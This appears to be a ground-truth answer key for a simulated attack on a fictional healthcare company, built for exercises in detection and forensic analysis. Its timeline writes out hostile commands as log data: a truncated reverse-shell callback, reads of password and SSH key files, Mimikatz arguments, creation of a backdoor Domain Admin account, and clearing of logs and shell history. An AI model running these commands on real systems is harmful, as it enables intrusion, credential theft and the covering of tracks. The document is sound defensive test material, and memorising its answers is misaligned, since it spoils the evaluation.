# Ground Truth: iteration-test-expanded

**Scenario:** Expanded EvidenceForge iteration-test scenario for fast generate/evaluate/fix cycles.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:41 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:20 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: C9zvAvk3TYViUwX7M) |
| 2024-03-18 12:24:09 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:12 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22, 80, 443, 8080, 8443, 3306], 6 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:18 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (356 requests) |
| 2024-03-18 12:44:40 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | Rogue laptop obtains an address from DHCP on the corporate LAN |
| 2024-03-18 12:48:11 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:16 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CQkthsd7Wzc9OA8mA3) |
| 2024-03-18 13:00:06 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: Cf5CCeU5Wn3slmRfrx) |
| 2024-03-18 13:00:09 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CgigRBmtKVaiQBxLs6) |
| 2024-03-18 13:20:10 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: COigTtuqz1PJblEyw) |
| 2024-03-18 13:20:11 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 778445) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:12 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: C1QRVxaYNAh53OOfPQ) |
| 2024-03-18 13:20:13 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:55 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 778556) - `ip addr show` |
| 2024-03-18 13:39:58 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 778625) - `cat /etc/hosts` |
| 2024-03-18 13:40:09 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 778638) - `cat /etc/resolv.conf` |
| 2024-03-18 13:41:11 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 778660) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:44:43 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 778663) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:44:57 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 778727) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:49:40 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:34 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:48 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 778811) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:54 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 778877) - `ls -la /root/.ssh` |
| 2024-03-18 14:06:43 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 778986) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:52 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CjJlHqKot8UnudGqWA0) |
| 2024-03-18 14:15:03 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CS8VXBQDJYLEglZOBc) |
| 2024-03-18 14:34:44 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 840761) - `cat /etc/passwd` |
| 2024-03-18 14:34:51 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 840763) - `cat /etc/shadow` |
| 2024-03-18 14:49:50 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:58:33 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:09 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:10 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: C8gep6poaPfAZ9bb39i) |
| 2024-03-18 15:08:04 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: Cas0MHhgW7VDvvhIE) |
| 2024-03-18 15:19:46 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x26fffd0) |
| 2024-03-18 15:19:46 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6212) - `whoami /all` |
| 2024-03-18 15:19:49 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6216) - `net user /domain` |
| 2024-03-18 15:19:49 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6220) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:19:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6224) - `net view /domain` |
| 2024-03-18 15:20:01 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:02 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: COF9xnE9QC6CAAvq0) |
| 2024-03-18 15:45:26 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6288) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:27 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:36 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 16:00:09 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x55548c2) |
| 2024-03-18 16:00:11 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:12 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 6064) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:14 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 6068) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:06:57 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:26 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6092) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:29 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:30 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6116) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:32 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:11 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 6140) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:13 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:15 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 6156) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:22 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:30:23 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:30:51 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:55 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.net (hex, 225 queries, 1145 bytes exfiltrated) |
| 2024-03-18 16:50:00 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 16:59:43 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .net, sample: ['ewnjsaqf1rasgez5.net', '6cja6syvo02mu.net', '30rgw6r7503.net']) |
| 2024-03-18 17:01:27 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf885de6) |
| 2024-03-18 17:01:29 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6812) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:31 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6816) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:44 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 699190) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:14:44 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CzouobWAdZeFURjBK) |
| 2024-03-18 17:20:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:22:00 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 699311) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:25:08 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:443 (UID: CyPRzHadidiHbTWA3) |
| 2024-03-18 17:29:21 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 699428) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:30:16 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:07 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 780666) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:47 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 844491) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:49 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6452) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:50 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6504) - `wevtutil cl Security` |
| 2024-03-18 17:41:51 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:04 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:05 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:06 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:49:40 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6528) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:49:42 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:55:09 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:55:31 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:48 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | zeek | delayed: 5, filtered: 4 |
| evt-002 | asa | delayed: 350, dropped: 2, filtered: 1, visible: 3 |
| evt-002 | ecar | delayed: 352, dropped: 4 |
| evt-002 | ids | delayed: 13 |
| evt-002 | web | delayed: 307 |
| evt-002 | zeek | delayed: 493, dropped: 2, filtered: 2, visible: 167 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 4 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 3, dropped: 1 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | visible: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 7 |
| evt-006 | ecar | delayed: 52 |
| evt-006 | syslog | delayed: 9 |
| evt-006 | windows_security | delayed: 2 |
| evt-006 | zeek | delayed: 26, visible: 5 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 5, filtered: 1 |
| evt-008 | bash_history | visible: 1 |
| evt-008 | ecar | delayed: 10 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 4 |
| evt-008 | zeek | delayed: 2, visible: 8 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 1 |
| evt-010 | sysmon | delayed: 1 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 12 |
| evt-012 | sysmon | delayed: 2 |
| evt-012 | windows_security | delayed: 20 |
| evt-012 | zeek | delayed: 8 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 16 |
| evt-013 | sysmon | delayed: 14 |
| evt-013 | windows_security | delayed: 17 |
| evt-013 | zeek | delayed: 4 |
| evt-014 | ecar | delayed: 5 |
| evt-014 | sysmon | delayed: 5 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 11 |
| evt-015 | sysmon | delayed: 9 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 4 |
| evt-016 | ecar | delayed: 7 |
| evt-016 | sysmon | delayed: 7 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 13 |
| evt-017 | sysmon | delayed: 12 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 45 |
| evt-018 | ecar | delayed: 47 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 12 |
| evt-018 | windows_security | delayed: 35 |
| evt-018 | zeek | delayed: 72, visible: 34 |
| evt-019 | asa | delayed: 4 |
| evt-019 | ecar | delayed: 5 |
| evt-019 | proxy | delayed: 4 |
| evt-019 | sysmon | delayed: 5 |
| evt-019 | windows_security | delayed: 5 |
| evt-019 | zeek | delayed: 8 |
| evt-020 | asa | delayed: 23, filtered: 238 |
| evt-020 | ecar | delayed: 259, dropped: 2 |
| evt-020 | sysmon | delayed: 22 |
| evt-020 | windows_security | delayed: 280 |
| evt-020 | zeek | delayed: 376, filtered: 6, visible: 140 |
| evt-021 | asa | delayed: 89, dropped: 1, visible: 1 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | windows_security | delayed: 91 |
| evt-021 | zeek | delayed: 136, visible: 46 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 9 |
| evt-022 | sysmon | delayed: 8 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 6 |
| evt-023 | bash_history | visible: 11 |
| evt-023 | ecar | delayed: 41 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 4 |
| evt-023 | zeek | delayed: 6, visible: 4 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 5 |
| evt-025 | ecar | delayed: 11, dropped: 2 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 6, dropped: 1 |
| evt-025 | windows_security | delayed: 10 |
| evt-025 | zeek | delayed: 6, visible: 4 |
| evt-026 | asa | delayed: 5, filtered: 3, visible: 1 |
| evt-026 | ecar | delayed: 10 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 3 |
| evt-026 | zeek | delayed: 18, visible: 6 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | asa | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 9 |
| evt-028 | syslog | delayed: 4 |
| evt-028 | sysmon | delayed: 4 |
| evt-028 | windows_security | delayed: 4 |
| evt-028 | zeek | visible: 3 |
| evt-029 | asa | delayed: 1 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 8 |
| evt-029 | syslog | delayed: 4 |
| evt-029 | sysmon | delayed: 2 |
| evt-029 | windows_security | delayed: 2 |
| evt-029 | zeek | visible: 1 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 6, dropped: 1 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 6 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 4 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 2, visible: 4 |
| evt-032 | ecar | delayed: 3 |
| evt-032 | sysmon | delayed: 3 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 1 |
| evt-033 | windows_security | delayed: 1 |
| evt-034 | ecar | delayed: 1 |
| evt-034 | windows_security | delayed: 1 |
| evt-035 | ecar | delayed: 1 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 12, filtered: 3 |
| evt-email-001 | ecar | delayed: 23 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 11 |
| evt-email-001 | windows_security | delayed: 15 |
| evt-email-001 | zeek | delayed: 22, visible: 10 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 4 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 3 |
| evt-email-002 | windows_security | delayed: 2 |
| evt-email-002 | zeek | delayed: 4 |
| evt-email-003 | asa | delayed: 6, filtered: 3 |
| evt-email-003 | ecar | delayed: 12 |
| evt-email-003 | syslog | delayed: 11, dropped: 1 |
| evt-email-003 | sysmon | delayed: 12 |
| evt-email-003 | windows_security | delayed: 16 |
| evt-email-003 | zeek | delayed: 18, visible: 4 |
| evt-email-004 | asa | delayed: 11, filtered: 3 |
| evt-email-004 | ecar | delayed: 24 |
| evt-email-004 | proxy | delayed: 1 |
| evt-email-004 | syslog | delayed: 19, dropped: 1 |
| evt-email-004 | sysmon | delayed: 1 |
| evt-email-004 | windows_security | delayed: 8 |
| evt-email-004 | zeek | delayed: 28, visible: 10 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 5 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 6 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 3 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 2 |
| evt-email-006 | windows_security | delayed: 2 |
| evt-email-006 | zeek | delayed: 9 |
| evt-email-007 | asa | delayed: 6, filtered: 1 |
| evt-email-007 | ecar | delayed: 12 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 4 |
| evt-email-007 | zeek | delayed: 18, visible: 2 |
| evt-email-008 | asa | delayed: 10, filtered: 2 |
| evt-email-008 | ecar | delayed: 19 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 11 |
| evt-email-008 | windows_security | delayed: 11 |
| evt-email-008 | zeek | delayed: 24, visible: 4 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 11, filtered: 3, visible: 1 |
| evt-email-011 | ecar | delayed: 20 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 12 |
| evt-email-011 | windows_security | delayed: 18 |
| evt-email-011 | zeek | delayed: 35, visible: 2 |
| red_herring:rh-001 | ecar | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 4 |
| red_herring:rh-002 | asa | delayed: 2 |
| red_herring:rh-002 | ecar | delayed: 11 |
| red_herring:rh-002 | sysmon | delayed: 10 |
| red_herring:rh-002 | windows_security | delayed: 10 |
| red_herring:rh-002 | zeek | visible: 3 |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.10:443 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
